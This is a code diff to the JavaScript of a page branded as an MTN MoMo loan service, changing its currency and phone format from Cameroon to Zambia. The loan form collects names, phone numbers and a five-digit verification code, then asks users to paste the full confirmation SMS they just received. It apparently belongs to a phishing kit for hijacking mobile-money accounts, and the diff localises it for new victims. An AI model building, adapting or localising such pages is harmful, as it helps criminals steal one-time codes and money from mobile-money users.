@@ -1,13 +1,12 @@
 // --- Translation Dictionary ---
-// Kept only English for simplicity as requested.
 const translations = {
     en: {
         calc_welcome: "MTN MoMo Loans and Advances", calc_welcome_sub: "Get loans easily through MTN MoMo",
         calc_title: "Loan Calculator", calc_amount: "Amount", calc_term: "Term", calc_monthly: "Monthly Payment", calc_btn: "START APPLICATION",
         form_step1: "Step 1 of 3", form_step2: "Step 2 of 3", form_step3: "Step 3 of 3",
-        form_loan_details: "Loan Details", form_loan_type: "Loan Type", form_loan_business: "Business Loan", form_loan_personal: "Personal Loan", form_loan_emergency: "Emergency Loan", form_loan_amount: "Loan Amount (XAF)", form_loan_term: "Loan Term", form_loan_purpose: "Purpose of Loan", 
-        form_personal_details: "Personal Details", form_first_name: "First Name", form_first_name_ph: "First Name", form_last_name: "Last Name", form_last_name_ph: "Last Name", form_phone: "Phone Number (Cameroon)", form_phone_ph: "9 digits (e.g., 670123456)", form_code: "5-Digit Verification Code", form_code_ph: "Enter 5-digit code",
-        form_emp_details: "Employment Details", form_emp_status: "Employment Status", form_emp_self: "Self-employed", form_emp_student: "Student", form_emp_full: "Employed full time", form_emp_part: "Employed part time", form_emp_unemployed: "Unemployed", form_annual_income: "Annual Income (XAF)", form_annual_income_ph: "e.g., 5000000",
+        form_loan_details: "Loan Details", form_loan_type: "Loan Type", form_loan_business: "Business Loan", form_loan_personal: "Personal Loan", form_loan_emergency: "Emergency Loan", form_loan_amount: "Loan Amount (ZMW)", form_loan_term: "Loan Term", form_loan_purpose: "Purpose of Loan", 
+        form_personal_details: "Personal Details", form_first_name: "First Name", form_first_name_ph: "First Name", form_last_name: "Last Name", form_last_name_ph: "Last Name", form_phone: "Phone Number (Zambia)", form_phone_ph: "9 digits (e.g., 971234567)", form_code: "5-Digit Verification Code", form_code_ph: "Enter 5-digit code",
+        form_emp_details: "Employment Details", form_emp_status: "Employment Status", form_emp_self: "Self-employed", form_emp_student: "Student", form_emp_full: "Employed full time", form_emp_part: "Employed part time", form_emp_unemployed: "Unemployed", form_annual_income: "Annual Income (ZMW)", form_annual_income_ph: "e.g., 5000000",
         form_next: "NEXT STEP", form_back: "BACK", form_submit: "SUBMIT APPLICATION",
         proc_title: "Processing Application", proc_subtitle: "Please wait, this may take a few seconds",
         sms_title_1: "Paste the", sms_title_2: "SMS", sms_subtitle_1: "We sent a confirmation message to your number.<br><strong>Copy the full SMS you received</strong> and paste it below.",
@@ -57,14 +56,14 @@ function updateLoanValue() {
     const amount = parseInt(amountSlider.value);
     const term = parseInt(termSlider.value);
     
-    amountDisplay.innerText = `XAF ${amount.toLocaleString()}`;
-    termDisplay.innerText = `${term} Months`; // Simplified since it is English only now
+    amountDisplay.innerText = `ZMW ${amount.toLocaleString()}`;
+    termDisplay.innerText = `${term} Months`; 
 
     const interestRate = 0.12; 
     const totalRepayment = amount + (amount * interestRate);
     const monthly = totalRepayment / term;
     
-    monthlyOutput.innerText = `XAF ${Math.ceil(monthly).toLocaleString()}`;
+    monthlyOutput.innerText = `ZMW ${Math.ceil(monthly).toLocaleString()}`;
 }
 
 updateLoanValue();
